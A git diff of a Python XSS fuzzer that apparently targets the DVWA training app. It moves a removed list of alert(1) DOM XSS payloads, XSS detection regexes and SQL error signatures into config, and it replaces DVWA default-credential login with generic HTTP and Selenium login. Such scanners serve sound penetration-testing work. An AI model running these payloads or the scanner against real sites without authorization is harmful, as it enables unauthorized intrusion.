@@ -6,42 +6,27 @@ from urllib.parse import urljoin, urlparse, quote
 from uuid import uuid4
 from html import escape
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from auth import seleniumLogin
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
+from requests.cookies import RequestsCookieJar
+
+from uni_fuzzer.auth.auth import seleniumLogin, login
+
+from uni_fuzzer.core.utility import get_cfg, isFuzzableField
+cfg = get_cfg()
 
 # Regex templates for XSS injections
-SCRIPT_RE = r"<script[^>]*>.*?<!--\s*({token})\s*-->.*?</script>"
-ATTR_RE   = r"\bon\w+\s*=\s*(['\"]).*?({token}).*?\1"
-JSURL_RE  = r"(?:href|src)\s*=\s*(['\"])\s*javascript:.*?({token}).*?\1"
+SCRIPT_RE = cfg["xss"]["regex"]["script"]
+ATTR_RE   = cfg["xss"]["regex"]["attr"]
+JSURL_RE  = cfg["xss"]["regex"]["jsurl"]
 
 # Cache for regex objects to avoid recompiling
 _regex_cache = {}
 
 # To exclude SQL errors when looking for XSS
-SQL = [
-    "you have an error in your sql syntax",
-    "mysql_fetch", "mysqli_", "pg_query", "syntax error at or near",
-    "unclosed quotation mark after the character string", "ora-"
-]
+SQL = cfg["sqli"]["error_signatures"]
 
-dom_payloads = [
-        "<img src=x onerror=alert(1)>",
-        "\"><img src=x onerror=alert(1)>",
-        "'\"><img src=x onerror=alert(1)>",
-        "<video src=x onerror=alert(1)>",
-        "<audio src=x onerror=alert(1)>",
-        "<details open ontoggle=alert(1)>",
-        "\"><svg/onload=alert(1)>",
-        "<svg/onload=alert(1)>",
-        "</script><script>alert(1)</script>",
-        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
-        "<body onload=alert(1)>",
-        "<img src=1 onerror=alert`1`>",
-        "<img src=x onerror=confirm(1)>",
-        "<marquee onstart=alert(1)>",
-        "javascript:alert(1)"
-    ]
+dom_payloads = cfg["xss"]["dom_payloads"]
 
 def canary(payload, token):
     """
@@ -78,44 +63,20 @@ def detectXSS(body, token, markedPayload):
 
     script_re, attr_re, jsurl_re = _regex_cache[token]
 
-    # Check if xss is in dangerous contexts
-    if script_re.search(body) or attr_re.search(body) or jsurl_re.search(body):
-        return True
-
     # Filter SQL errors
     if any(err in lowerBody for err in SQL):
         return False
 
-    # Check token in tags
-    if any(tag in lowerBody for tag in
-           ("<img", "<iframe", "<svg", "<a ", "<input", "<video", "<audio")) and f"<!--{token}-->" in lowerBody:
+    # Check if xss is in dangerous contexts
+    if script_re.search(body) or attr_re.search(body) or jsurl_re.search(body):
         return True
 
     return False
 
-def isFuzzableField(field):
-    """
-        Check if form field is fuzzable
-    """
-    if not field:
-        return False
-
-    lowered = field.lower()
-
-    # List of skips to avoid useless form fuzzing
-    skips = [
-        "user_token", "security", "login", "upload", "change", "submit",
-        "max_file_size", "step", "create_db", "password",
-        "btnclear", "btnsign","rememberme","captcha", "default"
-    ]
-
-    return not any(skip in lowered for skip in skips)
-
-
 
 class XSSFuzzer:
 
-    def __init__(self, baseUrl, useCrawler = False, outputToFile= False, wordlistPath=None,isDVWA= False, isSilent=False, headless= True):
+    def __init__(self, baseUrl, useCrawler = False, outputToFile= False, wordlistPath=None, isSilent=False, headless= True, session=None, loginUsername=None, loginPassword=None, loginPath=None, auth=False):
         self.baseUrl = baseUrl
         self.useCrawler = useCrawler
         self.wordlistPath = wordlistPath
@@ -125,19 +86,33 @@ class XSSFuzzer:
         self.token = f"XSSCanary-{uuid4().hex[:8]}"
         self.headless = headless
 
-        self.isDVWA = isDVWA
-        self.session = requests.Session()
-        self.userToken = ""
+        self.session = session or requests.Session()
+        self.headers = {"User-Agent": cfg["http"]["user_agent"]}
+
+        if cfg["http"]["add_referer"]:
+            self.headers["Referer"] = self.baseUrl
+
+        self.loginUsername = loginUsername
+        self.loginPassword = loginPassword
+        self.loginPath = loginPath
+        self.auth = auth
 
         self.vulnerableParams = []
 
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
-            "Referer": self.baseUrl,
-        }
+        if self.loginUsername and self.loginPassword and self.auth:
+            # Use the generic HTTP login in auth.py
+            ok = login(
+                self.session,
+                baseUrl=self.baseUrl,
+                username=self.loginUsername,
+                password=self.loginPassword,
+                loginPath=self.loginPath,
+                selectors=None,
+                headers=None
+            )
+            if not ok:
+                print("[-] HTTP login in XSSFuzzer failed")
 
-        if self.isDVWA:
-            self.login()
 
     def loadWordlist(self):
         """
@@ -160,18 +135,8 @@ class XSSFuzzer:
             Send a single GET request and check for success
         """
         try:
-            # Check if DVWA and add token
-            if self.isDVWA and self.userToken:
-                separator = '&' if '?' in url else '?'
-                url = f"{url}{separator}user_token={self.userToken}"
 
-            response = self.session.get(url, headers=self.headers, timeout=3, allow_redirects=False)
-
-            # Refresh token
-            if self.isDVWA:
-                tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', response.text)
-                if tokenMatch:
-                    self.userToken = tokenMatch.group(1)
+            response = self.session.get(url, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"], allow_redirects=cfg["http"]["redirects"]["fuzz_get"])
 
             # XSS detection
             if detectXSS(response.text, self.token, markedPayload):
@@ -212,7 +177,7 @@ class XSSFuzzer:
         tasks = []
         results = []
 
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=cfg["concurrency"]["max_workers"]) as executor:
             for payload in self.payloads:
                 # Replace FUZZ with the payload, uniqely mark it, encode it for URL injection
                 markedPayload = canary(payload, self.token)
@@ -234,7 +199,7 @@ class XSSFuzzer:
         """
         results = []
 
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=cfg["concurrency"]["max_workers"]) as executor:
             for form in forms:
                 tasks = []
                 # To track future information for saving
@@ -268,10 +233,8 @@ class XSSFuzzer:
                             else:
                                 data[field] = "test"
 
-                        if self.isDVWA and self.userToken:
-                            data.setdefault("user_token", self.userToken)
 
-                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=3, allow_redirects=False )
+                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"], allow_redirects=cfg["http"]["redirects"]["submit"])
 
                         tasks.append(fut)
                         ctx[fut] = (url, raw, marked)
@@ -290,7 +253,7 @@ class XSSFuzzer:
                         separator = "&" if "?" in url else "?"
                         fullUrl = f"{url}{separator}{'&'.join(params)}"
 
-                        fut = executor.submit( self.session.get, fullUrl, headers=self.headers, timeout=3,allow_redirects=False)
+                        fut = executor.submit( self.session.get, fullUrl, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"],allow_redirects=cfg["http"]["redirects"]["submit"])
 
                         tasks.append(fut)
                         ctx[fut] = (fullUrl, raw,marked)
@@ -305,11 +268,6 @@ class XSSFuzzer:
 
                     finUrl, raw, marked = ctx[fut]
 
-                    if self.isDVWA:
-                        tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', res.text)
-
-                        if tokenMatch:
-                            self.userToken = tokenMatch.group(1)
 
                     # Check for XSS
                     if detectXSS(res.text, self.token, marked):
@@ -330,7 +288,7 @@ class XSSFuzzer:
         results = []
         pages = set()
 
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=cfg["concurrency"]["max_workers"]) as executor:
             for form in forms:
                 tasks = []
                 ctx = {}
@@ -364,10 +322,8 @@ class XSSFuzzer:
                             else:
                                 data[field] = "test"
 
-                        if self.isDVWA and self.userToken:
-                            data.setdefault("user_token", self.userToken)
 
-                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=3,allow_redirects=False)
+                        fut = executor.submit(self.session.post, url, data=data, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"],allow_redirects=cfg["http"]["redirects"]["submit"])
 
                         tasks.append(fut)
                         ctx[fut] = (url,raw,marked)
@@ -386,7 +342,7 @@ class XSSFuzzer:
                         separator = "&" if "?" in url else "?"
                         fullUrl = f"{url}{separator}{'&'.join(params)}"
 
-                        fut = executor.submit(self.session.get, fullUrl, headers=self.headers, timeout=3,allow_redirects=False)
+                        fut = executor.submit(self.session.get, fullUrl, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"],allow_redirects=cfg["http"]["redirects"]["submit"])
 
                         tasks.append(fut)
                         ctx[fut] = (fullUrl, raw, marked)
@@ -400,12 +356,6 @@ class XSSFuzzer:
                         continue
 
                     finUrl, raw, marked = ctx[fut]
-
-                    if self.isDVWA:
-                        tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', res.text)
-
-                        if tokenMatch:
-                            self.userToken = tokenMatch.group(1)
 
                     # Follow redirections after submitting form
                     if res.status_code in (301, 302, 303,307, 308):
@@ -428,15 +378,15 @@ class XSSFuzzer:
         markedPayloads = [(raw, canary(raw, self.token)) for raw in self.payloads]
 
         # Revisit collected pages
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=cfg["concurrency"]["max_workers"]) as executor:
 
             futToPage = {
-                executor.submit(self.session.get,page
-                if (not (self.isDVWA and self.userToken)) else
-                    f"{page}{'&' if '?' in page else '?'}user_token={self.userToken}",
+                executor.submit(
+                    self.session.get,
+                    page,
                     headers=self.headers,
-                    timeout=3,
-                    allow_redirects=True
+                    timeout=cfg["http"]["timeout_get_seconds"],
+                    allow_redirects=cfg["http"]["redirects"]["stored_xss"]
                 ): page
                 for page in pages
             }
@@ -449,15 +399,6 @@ class XSSFuzzer:
 
                 except Exception:
                     continue
-
-                # Refresh DVWA token if needed
-                if self.isDVWA:
-                    tokenMatch = re.search(
-                        r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]',
-                        res.text
-                    )
-                    if tokenMatch:
-                        self.userToken = tokenMatch.group(1)
 
                 body = res.text
                 lowerBody = body.lower()
@@ -560,14 +501,37 @@ class XSSFuzzer:
 
         driver = webdriver.Chrome(options=options)
         try:
-            baseUrl = f"{urlparse(self.baseUrl).scheme}://{urlparse(self.baseUrl).netloc}"
+            # If selenium login true
+            if self.auth and self.loginUsername and self.loginPassword:
 
-            if self.isDVWA:
-                loggedIn = seleniumLogin(driver, baseUrl)
-                if not loggedIn:
-                    print("[!] Selenium login failed. Aborting domXSS fuzzing.")
-                    driver.quit()
+                base = f"{urlparse(self.baseUrl).scheme}://{urlparse(self.baseUrl).netloc}"
+
+                if not seleniumLogin(
+                        driver,
+                        baseUrl=base,
+                        username=self.loginUsername,
+                        password=self.loginPassword,
+                        loginPath=self.loginPath,
+                        selectors=None
+                ):
+                    if not self.isSilent:
+                        print("[-] Selenium login failed")
                     return results
+
+                try:
+                    jar = RequestsCookieJar()
+                    for c in driver.get_cookies():
+                        name, value = c.get("name"), c.get("value")
+                        domain, path = c.get("domain"), c.get("path") or "/"
+
+                        if name and value:
+                            jar.set(name=name, value=value, domain=domain, path=path)
+
+                    self.session.cookies.update(jar)
+
+                except Exception:
+                    pass
+
 
             seen = set()
             for finUrl, raw, marked in candidates:
@@ -580,13 +544,9 @@ class XSSFuzzer:
 
                 urlCheck = finUrl
 
-                # Add DVWA token if required
-                if self.isDVWA and self.userToken:
-                    urlCheck = f"{finUrl}{'&' if '?' in finUrl else '?'}user_token={self.userToken}"
-
                 # pre check with raw http to skip reflected XSS
                 try:
-                    pre = self.session.get(urlCheck, headers=self.headers, timeout= 3,allow_redirects=False)
+                    pre = self.session.get(urlCheck, headers=self.headers, timeout=cfg["http"]["timeout_get_seconds"],allow_redirects=cfg["http"]["redirects"]["fuzz_get"])
                     pre_body = pre.text or ""
                 except Exception:
                     pre_body = ""
@@ -598,8 +558,8 @@ class XSSFuzzer:
 
                 try:
                     driver.get(finUrl)
-                    # Estimate to allow for JS
-                    time.sleep(0.25)
+                    # time set in config/defaults
+                    time.sleep(cfg["xss"]["dom_delay_seconds"])
                     body = driver.page_source or ""
 
                     # Check if DOM XSS worked
@@ -618,60 +578,3 @@ class XSSFuzzer:
             driver.quit()
 
         return results
-
-    def login(self):
-        """
-            Log in to DVWA using default credentials and set security to low
-        """
-
-        parsed = urlparse(self.baseUrl)
-        base = f"{parsed.scheme}://{parsed.netloc}"
-
-        loginUrl = f"{base}/login.php"
-        securityUrl = f"{base}/security.php"
-
-        try:
-            loginPage = self.session.get(loginUrl, headers=self.headers)
-            # print("[DEBUG] Login page response\n:", loginPage.text)
-
-            tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', loginPage.text)
-
-            token = tokenMatch.group(1) if tokenMatch else ''
-            # print(f"[DEBUG] CSRF token from login page:{token}")
-
-            if not token:
-                print("[!] Could not extract CSRF token from login page!")
-
-                return False
-
-            loginData = {
-                "username": "admin",
-                "password": "password",
-                "Login": "Login",
-                "user_token": token
-            }
-
-            res = self.session.post(loginUrl, data=loginData, headers=self.headers)
-
-            if "Login failed" in res.text:
-                print("[!] Login failed. Check credentials.")
-                return False
-
-            securityPage = self.session.get(securityUrl, headers=self.headers)
-            tokenMatch = re.search(r'name=[\'"]user_token[\'"]\s*value=[\'"]([^\'"]+)[\'"]', securityPage.text)
-            token = tokenMatch.group(1) if tokenMatch else ''
-
-            securityData = {
-                "security": "low",
-                "seclev_submit": "Submit",
-                "user_token": token
-            }
-
-            self.session.post(securityUrl, data=securityData, headers=self.headers)
-            # print("[+] Logged in to DVWA and set security level to low")
-
-            return True
-
-        except requests.RequestException as e:
-            print(f"[!] Login request failed: {e}")
-            return False
